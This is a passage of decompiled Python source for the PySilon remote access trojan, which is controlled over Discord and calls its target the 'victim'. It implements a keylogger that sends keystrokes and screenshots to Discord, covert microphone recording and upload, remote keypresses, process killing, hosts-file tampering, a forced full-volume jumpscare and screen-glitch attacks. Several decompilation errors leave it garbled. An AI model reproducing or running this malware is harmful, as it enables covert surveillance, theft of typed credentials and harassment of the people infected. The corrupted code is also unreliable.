                                                                                                                                                                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                                                    reaction_msg = await message.channel.send(embed=embed)
                                                                                                                                                                    await reaction_msg.add_reaction('🔴')
                                                                                                                                                                    log('Sent message with usage of \".tts\" (texttospeech.py:13->source_assembled.py:1836)')
                                                                                                                                                                    return
                                                                                                                                                                else:  # inserted
                                                                                                                                                                    requested_tts = message.content[5:]
                                                                                                                                                                    engine = pyttsx3.init()
                                                                                                                                                                    log('Initialized pyttsx3 Text-to-Speech engine(texttospeech.py:17->source_assembled.py:1840)')
                                                                                                                                                                    engine.say(requested_tts)
                                                                                                                                                                    log('Registered requested tts message(texttospeech.py:19->source_assembled.py:1842)')
                                                                                                                                                                    engine.runAndWait()
                                                                                                                                                                    log('Run tts engine(texttospeech.py:21->source_assembled.py:1844)')
                                                                                                                                                                    engine.stop()
                                                                                                                                                                    log('Stopped tts engine(texttospeech.py:23->source_assembled.py:1846)')
                                                                                                                                                                    embed = discord.Embed(title='🟢 Success', description=f'```Successfully played TTS message: \"{requested_tts}\"```', colour=discord.Colour.green())
                                                                                                                                                                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                                                    reaction_msg = await message.channel.send(embed=embed)
                                                                                                                                                                    await reaction_msg.add_reaction('🔴')
                                                                                                                                                                    log('Sent embed about successfully playing tts message(texttospeech.py:27->source_assembled.py:1850)')
                                                                                                                                                                    return
                                                                                                                                                            else:  # inserted
                                                                                                                                                                if message.content[:7] == '.volume':
                                                                                                                                                                    log('Message is \"volume\"(audio_control.py:9->source_assembled.py:1852)')
                                                                                                                                                                    await message.delete()
                                                                                                                                                                    log('Removed the message (audio_control.py:11->source_assembled.py:1854)')
                                                                                                                                                                    if message.content.strip() == '.volume':
                                                                                                                                                                        embed = discord.Embed(title='📛 Error', description='```Syntax: .volume <0 - 100>```', colour=discord.Colour.red())
                                                                                                                                                                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                                                        reaction_msg = await message.channel.send(embed=embed)
                                                                                                                                                                        await reaction_msg.add_reaction('🔴')
                                                                                                                                                                        return
                                                                                                                                                                    else:  # inserted
                                                                                                                                                                        volume_int = message.content[8:]
                                                                                                                                                                        devices = AudioUtilities.GetSpeakers()
                                                                                                                                                                        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                                                                                                                                                                        volume = cast(interface, POINTER(IAudioEndpointVolume))
                                                                                                                                                                        volume_int = int(volume_int)
                                                                                                                                                                        volume_int = volume_int | 100
                                                                                                                                                                        if volume_int <= 1 and volume_int >= 0:
                                                                                                                                                                            volume.SetMasterVolumeLevelScalar(volume_int, None)
                                                                                                                                                                            embed = discord.Embed(title=f"{'🟢 Success':```Successfully set volume to {volume_int + 100}}%```", description=discord.Colour.green())
                                                                                                                                                                            embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                                                            reaction_msg = await message.channel.send(embed=embed)
                                                                                                                                                                            await reaction_msg.add_reaction('🔴')
                                                                                                                                                                        else:  # inserted
                                                                                                                                                                            embed = discord.Embed(title='📛 Error', description='```Syntax: .volume <0 - 100>```', colour=discord.Colour.red())
                                                                                                                                                                            embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                                                            reaction_msg = await message.channel.send(embed=embed)
                                                                                                                                                                            await reaction_msg.add_reaction('🔴')
                                                                                                                                                                else:  # inserted
                                                                                                                                                                    if message.content[:5] == '.play':
                                                                                                                                                                        await message.delete()
                                                                                                                                                                        log('Removed the message (audio_control.py:35->source_assembled.py:1877)')
                                                                                                                                                                        if message.content.strip() == '.play':
                                                                                                                                                                            embed = discord.Embed(title='📛 Error', description='```Syntax: .play <path/to/audio-file.mp3>```', colour=discord.Colour.red())
                                                                                                                                                                            embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                                                            reaction_msg = await message.channel.send(embed=embed)
                                                                                                                                                                            await reaction_msg.add_reaction('🔴')
                                                                                                                                                                        else:  # inserted
                                                                                                                                                                            if not message.content.endswith('.mp3'):
                                                                                                                                                                                embed = discord.Embed(title='📛 Error', description='```Not a valid file type.```', colour=discord.Colour.red())
                                                                                                                                                                                embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                                                                reaction_msg = await message.channel.send(embed=embed)
                                                                                                                                                                                await reaction_msg.add_reaction('🔴')
                                                                                                                                                                            else:  # inserted
                                                                                                                                                                                def play_audio():
                                                                                                                                                                                    audio_file = message.content[6:]
                                                                                                                                                                                    audio_file = audio_file.replace('\\', '/')
                                                                                                                                                                                    pygame.mixer.init()
                                                                                                                                                                                    pygame.mixer.music.load(audio_file)
                                                                                                                                                                                    pygame.mixer.music.play()
                                                                                                                                                                                    while pygame.mixer.music.get_busy():
                                                                                                                                                                                        pass
                                                                                                                                                                                    pygame.mixer.quit()
                                                                                                                                                                                threading.Thread(target=play_audio).start()
                                                                                                                                                                    else:  # inserted
                                                                                                                                                                        if message.content == '.monitors-off':
                                                                                                                                                                            if not turned_off:
                                                                                                                                                                                await message.delete()
                                                                                                                                                                                turned_off = True

                                                                                                                                                                                def monitor_off():
                                                                                                                                                                                    while turned_off:
                                                                                                                                                                                        for monitor in monitorcontrol.get_monitors():
                                                                                                                                                                                            with monitor:
                                                                                                                                                                                                monitor.set_power_mode(4)
                                                                                                                                                                                threading.Thread(target=monitor_off).start()
                                                                                                                                                                                embed = discord.Embed(title='🟢 Success', description='```Monitor turned off. Turn it back on by using .monitors-on```', colour=discord.Colour.green())
                                                                                                                                                                                embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                                                                await message.channel.send(embed=embed)
                                                                                                                                                                            else:  # inserted
                                                                                                                                                                                embed = discord.Embed(title='🔴 Hold on!', description='```Monitor already turned off. Turn it back on by using .monitors-on```', colour=discord.Colour.red())
                                                                                                                                                                                embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                                                                await message.channel.send(embed=embed)
                                                                                                                                                                        else:  # inserted
                                                                                                                                                                            if message.content == '.monitors-on':
                                                                                                                                                                                if turned_off:
                                                                                                                                                                                    await message.delete()
                                                                                                                                                                                    for monitor in monitorcontrol.get_monitors():
                                                                                                                                                                                        with monitor:
                                                                                                                                                                                            monitor.set_power_mode(1)
                                                                                                                                                                                    embed = discord.Embed(title='🟢 Success', description='```Monitor has been turned on. Turn it off by using .monitors-off```', colour=discord.Colour.green())
                                                                                                                                                                                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                                                                    await message.channel.send(embed=embed)
                                                                                                                                                                                    turned_off = False
                                                                                                                                                                                else:  # inserted
                                                                                                                                                                                    embed = discord.Embed(title='🔴 Hold on!', description='```The monitor is not turned off. Turn it off by using .monitors-off```', colour=discord.Colour.red())
                                                                                                                                                                                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                                                                    await message.channel.send(embed=embed)
                                                                                                                                                                            else:  # inserted
                                                                                                                                                                                if message.content[:14] == '.block-website':
                                                                                                                                                                                    await message.delete()
                                                                                                                                                                                    if message.content.strip() == '.block-website':
                                                                                                                                                                                        embed = discord.Embed(title='📛 Error', description='```Syntax: .block-website <https://example.com>```', colour=discord.Colour.red())
                                                                                                                                                                                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                                                                        await message.channel.send(embed=embed)
                                                                                                                                                                                    else:  # inserted
                                                                                                                                                                                        match = message.content[15:]
                                                                                                                                                                                        await message.channel.send(match)
                                                                                                                                                                                        parsed_url = urlparse(match)
                                                                                                                                                                                        host_entry = f'127.0.0.1 {parsed_url.netloc}\n'
                                                                                                                                                                                        hosts_file_path = get_hosts_file_path()
                                                                                                                                                                                        if hosts_file_path:
                                                                                                                                                                                            with open(hosts_file_path, 'a') as hosts_file:
                                                                                                                                                                                                hosts_file.write(host_entry)
                                                                                                                                                                                            embed = discord.Embed(title='🟢 Success', description=f'```Website {match} has been blocked. Unblock it by using .webunblock [websitename]```', colour=discord.Colour.green())
                                                                                                                                                                                            embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                                                                            await message.channel.send(embed=embed)
                                                                                                                                                                                        else:  # inserted
                                                                                                                                                                                            embed = discord.Embed(title='🔴 Hold on!', description='```Hostfile not found or no permissions```', colour=discord.Colour.red())
                                                                                                                                                                                            embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                                                                            await message.channel.send(embed=embed)
                                                                                                                                                                                else:  # inserted
                                                                                                                                                                                    if message.content[:16] == '.unblock-website':
                                                                                                                                                                                        await message.delete()
                                                                                                                                                                                        if message.content.strip() == '.unblock-website':
                                                                                                                                                                                            embed = discord.Embed(title='📛 Error', description='```Syntax: .unblock-website <example.com>```', colour=discord.Colour.red())
                                                                                                                                                                                            embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                                                                            await message.channel.send(embed=embed)
                                                                                                                                                                                        else:  # inserted
                                                                                                                                                                                            match = message.content[17:]
                                                                                                                                                                                            match = match.replace('https://', '')
                                                                                                                                                                                            match = match.replace('http://', '')
                                                                                                                                                                                            hosts_file_path = get_hosts_file_path()
                                                                                                                                                                                            if hosts_file_path:
                                                                                                                                                                                                with open(hosts_file_path, 'r') as hosts_file:
                                                                                                                                                                                                    lines = hosts_file.readlines()
                                                                                                                                                                                                filtered_lines = [line for line in lines if website not in line]
                                                                                                                                                                                                with open(hosts_file_path, 'w') as hosts_file:
                                                                                                                                                                                                    hosts_file.writelines(filtered_lines)
                                                                                                                                                                                                embed = discord.Embed(title='🟢 Success', description=f'```Website {match} has been unblocked.```', colour=discord.Colour.green())
                                                                                                                                                                                                embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                                                                                await message.channel.send(embed=embed)
                                                                                                                                                                                            else:  # inserted
                                                                                                                                                                                                embed = discord.Embed(title='🔴 Hold on!', description='```Hostfile not found or no permissions```', colour=discord.Colour.red())
                                                                                                                                                                                                embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                                                                                await message.channel.send(embed=embed)
                                                                                                                                                                                    else:  # inserted
                                                                                                                                                                                        if message.content == '.jumpscare':
                                                                                                                                                                                            await message.delete()
                                                                                                                                                                                            devices = AudioUtilities.GetSpeakers()
                                                                                                                                                                                            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                                                                                                                                                                                            volume = cast(interface, POINTER(IAudioEndpointVolume))
                                                                                                                                                                                            video_url = 'https://github.com/mategol/PySilon-malware/raw/py-dev/resources/icons/jumpscare.mp4'
                                                                                                                                                                                            temp_folder = os.environ['TEMP']
                                                                                                                                                                                            temp_file = os.path.join(temp_folder, 'jumpscare.mp4')
                                                                                                                                                                                            if not os.path.exists(temp_file):
                                                                                                                                                                                                response = requests.get(video_url)
                                                                                                                                                                                                with open(temp_file, 'wb') as file:
                                                                                                                                                                                                    file.write(response.content)
                                                                                                                                                                                            time.sleep(1)
                                                                                                                                                                                            os.startfile(temp_file)
                                                                                                                                                                                            time.sleep(0.6)
                                                                                                                                                                                            get_video_window = win32gui.GetForegroundWindow()
                                                                                                                                                                                            win32gui.ShowWindow(get_video_window, win32con.SW_MAXIMIZE)
                                                                                                                                                                                            volume.SetMasterVolumeLevelScalar(1.0, None)
                                                                                                                                                                                            embed = discord.Embed(title='🟢 Success', description='```Jumpscare has been triggered.```', colour=discord.Colour.green())
                                                                                                                                                                                            embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                                                                            await message.channel.send(embed=embed)
                                                                                                                                                                                        else:  # inserted
                                                                                                                                                                                            if message.content[:4] == '.key':
                                                                                                                                                                                                await message.delete()
                                                                                                                                                                                                if message.content.strip() == '.key':
                                                                                                                                                                                                    embed = discord.Embed(title='📛 Error', description='```Syntax: .key <keys-to-press>```', colour=discord.Colour.red())
                                                                                                                                                                                                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                                                                                    reaction_msg = await message.channel.send(embed=embed)
                                                                                                                                                                                                    await reaction_msg.add_reaction('🔴')
                                                                                                                                                                                                    return
                                                                                                                                                                                                else:  # inserted
                                                                                                                                                                                                    keystrokes = message.content[5:]
                                                                                                                                                                                                    if 'ALTTAB' in keystrokes:
                                                                                                                                                                                                        pyautogui.hotkey('alt', 'tab')
                                                                                                                                                                                                    else:  # inserted
                                                                                                                                                                                                        if 'ALTF4' in keystrokes:
                                                                                                                                                                                                            pyautogui.hotkey('alt', 'f4')
                                                                                                                                                                                                        else:  # inserted
                                                                                                                                                                                                            for key in keystrokes:
                                                                                                                                                                                                                pyautogui.press(key)
                                                                                                                                                                                                    embed = discord.Embed(title='🟢 Success', description='```All keys have been succesfully pressed```', colour=discord.Colour.green())
                                                                                                                                                                                                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                                                                                    reaction_msg = await message.channel.send(embed=embed)
                                                                                                                                                                                                    await reaction_msg.add_reaction('🔴')
                                                                                                                                                                                            else:  # inserted
                                                                                                                                                                                                if message.content == '.display-graphic':
                                                                                                                                                                                                    await message.delete()
                                                                                                                                                                                                    embed = discord.Embed(title='📤 Provide a file containing graphic', description='Send your .drawdata file here', colour=discord.Colour.blue())
                                                                                                                                                                                                    embed.set_author(name='PySilon Malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                                                                                    await message.channel.send(embed=embed)
                                                                                                                                                                                                    expectation = 'graphic_file'
                                                                                                                                                                                                else:  # inserted
                                                                                                                                                                                                    if message.content[:15] == '.display-glitch':
                                                                                                                                                                                                        await message.delete()
                                                                                                                                                                                                        if message.content.strip() == '.display-glitch':
                                                                                                                                                                                                            embed = discord.Embed(title='📛 Error', description='```Syntax: .display-glitch <glitch_name>\nTo list all currently available glitches, type .display-glitch list```', colour=discord.Colour.red())
                                                                                                                                                                                                            embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                                                                                            reaction_msg = await message.channel.send(embed=embed)
                                                                                                                                                                                                            await reaction_msg.add_reaction('🔴')
                                                                                                                                                                                                            log('Sent message with usage of \".show\" (screen_manipulation.py:26->source_assembled.py:2025)')
                                                                                                                                                                                                            return
                                                                                                                                                                                                        else:  # inserted
                                                                                                                                                                                                            if message.content[16:] == 'list':
                                                                                                                                                                                                                embed = discord.Embed(title='📃 List of currently available glitches:', description=f"- {'- '.join(flash_screen('list'))}\n`NOTE: This list will dramatically increase it\'s size in release v4.1`", colour=discord.Colour.blue())
                                                                                                                                                                                                                embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                                                                                                reaction_msg = await message.channel.send(embed=embed)
                                                                                                                                                                                                                await reaction_msg.add_reaction('🔴')
                                                                                                                                                                                                            else:  # inserted
                                                                                                                                                                                                                if message.content[16:] in ('\n' or flash_screen('list')):
                                                                                                                                                                                                                    flash_screen(message.content[16:])
                                                                                                                                                                                                                    embed = discord.Embed(title='🟢 Glitch succesfully executed', description='Remember to ⭐ our repository', colour=discord.Colour.blue())
                                                                                                                                                                                                                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                                                                                                    reaction_msg = await message.channel.send(embed=embed)
                                                                                                                                                                                                                    await reaction_msg.add_reaction('🔴')
                                                                                                                                                                                                                else:  # inserted
                                                                                                                                                                                                                    embed = discord.Embed(title='📛 Error', description='```Invalid argument!```', colour=discord.Colour.red())
                                                                                                                                                                                                                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                                                                                                    reaction_msg = await message.channel.send(embed=embed)
                                                                                                                                                                                                                    await reaction_msg.add_reaction('🔴')
                                                                                                                                                                                                    else:  # inserted
                                                                                                                                                                                                        if expectation == 'graphic_file':
                                                                                                                                                                                                            try:
                                                                                                                                                                                                                split_v1 = str(message.attachments).split('filename=\'')[1]
                                                                                                                                                                                                                filename = str(split_v1).split('\' ')[0]
                                                                                                                                                                                                                filename = f'C:\\Users\\{getuser()}\\{software_directory_name}\\' + filename
                                                                                                                                                                                                                await message.attachments[0].save(fp=filename)
                                                                                                                                                                                                                screen_manipulator(filename).display_graphic(10)
                                                                                                                                                                                                                embed = discord.Embed(title='Graphic successfully displayed', description='Victim should see it on their screen for 10 seconds.\n`This functionality will be HUGELY improved in release v4.1`', colour=discord.Colour.green())
                                                                                                                                                                                                                embed.set_author(name='PySilon Malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                                                                                                await message.channel.send(embed=embed)
                                                                                                                                                                                                            except Exception as err:
                                                                                                                                                                                                                await message.channel.send(f'```❗ Something went wrong while fetching graphic file...\n{str(err)}```')
                                                                                                                                                                                                                expectation = None
                                                                                                                                                                                                                return None
                                                                                                                                                                                                        if expectation == 'onefile':
                                                                                                                                                                                                            log('Message is onefile upload candidate (file_uploading.py:97->source_assembled.py:2054)')
                                                                                                                                                                                                            split_v1 = str(message.attachments).split('filename=\'')[1]
                                                                                                                                                                                                            filename = str(split_v1).split('\' ')[0]
                                                                                                                                                                                                            log('Fetched the file name (file_uploading.py:100->source_assembled.py:2057)')
                                                                                                                                                                                                            reaction_msg = await message.channel.send(('```This file will be uploaded to  ' + '/'.join(working_directory)) + '/' + filename + '  after you react with 📤 to this message, or with 🔴 to cancel this operation```')
                                                                                                                                                                                                            log('Sent confirmation message for upload (file_uploading.py:102->source_assembled.py:2059)')
                                                                                                                                                                                                            await reaction_msg.add_reaction('📤')
                                                                                                                                                                                                            log('Reacted with \"confirm upload\" (file_uploading.py:104->source_assembled.py:2061)')
                                                                                                                                                                                                            await reaction_msg.add_reaction('🔴')
                                                                                                                                                                                                            log('Reacted with \"cancel uploading\" (file_uploading.py:106->source_assembled.py:2063)')
                                                                                                                                                                                                            one_file_attachment_message = message
                                                                                                                                                                                                        else:  # inserted
                                                                                                                                                                                                            if expectation == 'multiplefiles':
                                                                                                                                                                                                                log('Message probably contains part of a bigger file (file_uploading.py:109->source_assembled.py:2066)')
                                                                                                                                                                                                                files_to_merge[1].append(message)
                                                                                                                                                                                                                log('Logged a file to download (file_uploading.py:111->source_assembled.py:2068)')

def on_press(key):
    global text_buffor  # inserted
    processed_key = str(key)[1:(-1)] if str(key)[0] == '\'' and str(key)[(-1)] == '\'' else key
    keycodes = {Key.space: ' ', Key.shift: ' *`SHIFT`*', Key.tab: ' *`TAB`*', Key.backspace: ' *`<`*', Key.esc: ' *`ESC`*', Key.caps_lock: ' *`CAPS LOCK`*', Key.f1: ' *`F1`*', Key.f2: ' *`F2`*', Key.f3: ' *`F3`*', Key.f4: ' *`F4`*', Key.f5: ' *`F5`*', Key.f6: ' *`F6`*', Key.f7: ' *`F7`*', Key.f8: ' *`F8`*', Key.f9: ' *`F9`*', Key.f10: ' *`F10`*', Key.f11: ' *`F11`*', Key.f12: ' *`F12`*'}
    if processed_key in ctrl_codes.keys():
        processed_key = f' `' + ctrl_codes[processed_key] + '`'
        log('Victim has used the CTRL shortcut(keylogger.py:33->source_assembled.py:2095)')
    if processed_key not in [Key.ctrl_l, Key.alt_gr, Key.left, Key.right, Key.up, Key.down, Key.delete, Key.alt_l, Key.shift_r]:
        for i in keycodes:
            if processed_key == i:
                processed_key = keycodes[i]
        if processed_key == Key.enter:
            processed_key = ''
            messages_to_send.append([channel_ids['main'], text_buffor + ' *`ENTER`*'])
            text_buffor = ''
        else:  # inserted
            if processed_key == Key.print_screen or processed_key == '@':
                log('Print screen or @ pressed(keylogger.py:41->source_assembled.py:2103)')
                processed_key = ' *`Print Screen`*' if processed_key == Key.print_screen else '@'
                ImageGrab.grab(all_screens=True).save('ss.png')
                log('Saved screenshot of this PC(keylogger.py:44->source_assembled.py:2106)')
                embeds_to_send.append([channel_ids['main'], current_time() + (' `[Print Screen pressed]`' if processed_key == ' *`Print Screen`*' else ' `[Email typing]`'), 'ss.png'])
                log('Added new embed to send (containing screenshot of this PC)(keylogger.py:46->source_assembled.py:2108)')
        text_buffor = text_buffor | str(processed_key)
        if len(text_buffor) > 1975:
            if 'wwwww' in text_buffor or 'aaaaa' in text_buffor or 'sssss' in text_buffor or ('ddddd' in text_buffor):
                messages_to_send.append([channel_ids['spam'], text_buffor])
            else:  # inserted
                messages_to_send.append([channel_ids['main'], text_buffor])
            text_buffor = ''

class PyAudioPCM(discord.AudioSource):
    def __init__(self, channels=2, rate=48000, chunk=960, input_device=1) -> None:
        log('Started PyAudioPCM class (live_microphone.py:23->source_assembled.py:2118)')
        p = pyaudio.PyAudio()
        log('Initialized PyAudio (live_microphone.py:25->source_assembled.py:2120)')
        self.chunks = chunk
        self.input_stream = p.open(format=pyaudio.paInt16, channels=channels, rate=rate, input=True, input_device_index=input_device, frames_per_buffer=chunk)
        log('Started streaming the audio (live_microphone.py:28->source_assembled.py:2123)')

    def read(self) -> bytes:
        return self.input_stream.read(self.chunks)

def start_recording():
    log('Trying to start microphone recording (microphone_recording.py:9->source_assembled.py:2128)')
    while True:
        if send_recordings:
            recorded_mic = sounddevice.rec(int(1920000), samplerate=16000, channels=1)
            log('Initialized sounddevice recording class (microphone_recording.py:13->source_assembled.py:2132)')
            sounddevice.wait()
            log('Recorded audio from microphone (microphone_recording.py:15->source_assembled.py:2134)')
            os.mkdir('rec_')
        except:
            pass
            record_name = f'rec_\\' + current_time() + f'.wav'
            write(record_name, 16000, recorded_mic)
            log('Saved recorded microphone into file (microphone_recording.py:20->source_assembled.py:2139)')
            files_to_send.append([channel_ids['recordings'], '', record_name, True])
            log('Added new file to send (containing microphone recording) (microphone_recording.py:22->source_assembled.py:2141)')
        else:  # inserted
            time.sleep(20)

def check_int(to_check):
    try:
        asd = int(to_check) - 1
        return True
    except:
        return False

def active_window_process_name():
    try:
        pid = GetWindowThreadProcessId(GetForegroundWindow())
        return Process(pid[(-1)]).name()
    except:
        return None

def process_blacklister():
    while True:
        if os.path.exists(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln'):
            with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'r', encoding='utf-8') as disabled_processes:
                process_blacklist = disabled_processes.readlines()
            for x, y in enumerate(process_blacklist):
                process_blacklist[x] = y.replace('\n', '')
            for process in process_blacklist:
                if process.lower() in [proc.name().lower() for proc in process_iter()]:
                    stdout = force_decode(subprocess.run(f'taskkill /f /IM {process} /t', capture_output=True, shell=True).stdout).strip()
                    log('Tried to kill provided process(process.py:251->source_assembled.py:2165)')
                    time.sleep(1)
                    if process.lower() not in [proc.name().lower() for proc in process_iter()]:
                        log('Process is not running anymore (process.py:254->source_assembled.py:2168)')
                        embed = discord.Embed(title='🟢 Success', description=f'```Process Blacklister killed {process}```', colour=discord.Colour.green())
                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                        embeds_to_send.append([channel_ids['main'], embed])
                        log('Sent message about successful kill(process.py:258->source_assembled.py:2172)')
                    else:  # inserted
                        log('Process is still running (process.py:260->source_assembled.py:2174)')
                        embed = discord.Embed(title='📛 Error', description=f'```Process Blacklister tried to kill {process} but it\'s still running...```', colour=discord.Colour.red())
                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                        embeds_to_send.append([channel_ids['main'], embed])
                        log('Sent message about unsuccessfull kill (process.py:264->source_assembled.py:2178)')
        time.sleep(1)

def send_custom_message(title, text, style):
    response = ctypes.windll.user32.MessageBoxW(0, text, title, style)
    possible_responses = ['', 'OK', 'Cancel', 'Abort', 'Retry', 'Ignore', 'Yes', 'No', '', '', 'Try Again', 'Continue']
    embed = discord.Embed(title='📧 User responded!', description=f'The response for Message(title=\"{title}\", text=\"{text}\", style={style})\nis:```{possible_responses[int(response)]}```', colour=discord.Colour.green())
    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
    embeds_to_send.append([channel_ids['main'], embed])

def get_hosts_file_path():
    hosts_file_path = 'C:\\Windows\\System32\\drivers\\etc\\hosts'
    if ctypes.windll.kernel32.GetFileAttributesW(hosts_file_path)!= (-1):
        return hosts_file_path
    return None

class screen_manipulator:
    def __init__(self, saved_file):
        with open(saved_file, 'r', encoding='utf-8') as read_data:
            input_data = read_data.readlines()[0]
        settings, pixeldata = input_data.split('|')
        self.settings = json.loads(settings)
        self.pixeldata = pixeldata.split(',')
        self.saved_file = saved_file
        self.canvas_width, self.canvas_height = (self.settings['resolution'][0], self.settings['resolution'][1])

    def hex_to_rgb(self, hex):
        rgb = []
        hex = hex[1:]
        for i in [0, 2, 4]:
            decimal = int(hex[i:i + 2], 16)
            rgb.append(decimal)
        return tuple(rgb)

    def display_graphic(self, seconds):
        with open(self.saved_file, 'r', encoding='utf-8') as load_data:
            data = load_data.readlines()
        frame, unfetched_pixels = data[0].split('|')
        frame = json.loads(frame)
        pixels = []
        for line in unfetched_pixels.split(','):
            x, y = line.split(':')[0].split('.')
            if frame['mode'] == 'img':
                color = line.split(':')[1]
            else:  # inserted
                if frame['mode'] == 'bmp':
                    color = frame['color']
            pixels.append((int(x), int(y), self.hex_to_rgb(color)))
        size = frame['size']
        screen_dc = GetDC(0)
        screen_x_resolution = GetDeviceCaps(screen_dc, DESKTOPHORZRES)
        screen_y_resolution = GetDeviceCaps(screen_dc, DESKTOPVERTRES)
        starting_pos = (int(screen_x_resolution, int(frame['position'][0]) + 100), int(screen_y_resolution, int(frame['position'][1]) + 100))
        drawing = pixels
        start_time = time.time()
        while time.time() < start_time < seconds:
            screen_dc = GetDC(0)
            for pixel in drawing:
                brush = CreateSolidBrush(RGB(pixel[2][0], pixel[2][1], pixel[2][2]))
                SelectObject(screen_dc, brush)
                PatBlt(screen_dc = (starting_pos[0], pixel[0], size) (), starting_pos[1], pixel[1], size)
            DeleteObject(brush)
            ReleaseDC(0, screen_dc)

def flash_screen(effect):
    hdc = GetDC(0)
    x, y = (GetSystemMetrics(0), GetSystemMetrics(1))
    if effect == 'list':
        return ['invert\n', 'noise\n', 'lines\n', 'invert_squares\n', 'color_squares\n', 'diagonal_lines\n', 'snowfall\n', 'hypnotic_spirals\n', 'random_lines\n']
    if effect == 'invert':
        while True:
            PatBlt(hdc, 0, 0, x, y, PATINVERT)
    if effect == 'noise':
        for _ in range((x, y) + 20):
            rand_x = random.randint(0, x)
            rand_y = random.randint(0, y)
            size = 100
            color = RGB(random.randrange(1), random.randrange(1), random.randrange(1))
            brush = CreateSolidBrush(color)
            SelectObject(hdc, brush)
            PatBlt(hdc, rand_x, rand_y, size, size, PATCOPY)
    else:  # inserted
        if effect == 'lines':
            for _ in range(0, y, 5):
                PatBlt(hdc, 0, _, x, 2, PATINVERT)
        else:  # inserted
            if effect == 'invert_squares':
                for _ in range(200):
                    rand_x1 = random.randint(0, x)
                    rand_y1 = random.randint(0, y)
                    rand_x2 = random.randint(0, x)
                    rand_y2 = random.randint(0, y)
                    PatBlt(hdc, rand_x1, rand_y1, rand_x2 or rand_x1, rand_y2 or rand_y1, PATINVERT)
            else:  # inserted
                if effect == 'color_squares':
                    for i in range(10):
                        for x in range(0, x, 20):
                            for y in range(0, y, 20):
                                brush = CreateSolidBrush(RGB(random.randrange(255), random.randrange(255), random.randrange(255)))
                                SelectObject(hdc, brush)
                                PatBlt(hdc, x, y, 10, 10, PATCOPY)
                                DeleteObject(brush)
                                brush = CreateSolidBrush(RGB(random.randrange(255), random.randrange(255), random.randrange(255)))
                                SelectObject(hdc, brush)
                                PatBlt(hdc, x 0, y 0, 10, 10, PATCOPY)
                                DeleteObject(brush)
                else:  # inserted
                    if effect == 'diagonal_lines':
                        for x in range(0, x, 10):
                            brush = CreateSolidBrush(RGB(random.randrange(255), random.randrange(255), random.randrange(255)))
                            SelectObject(hdc, brush)
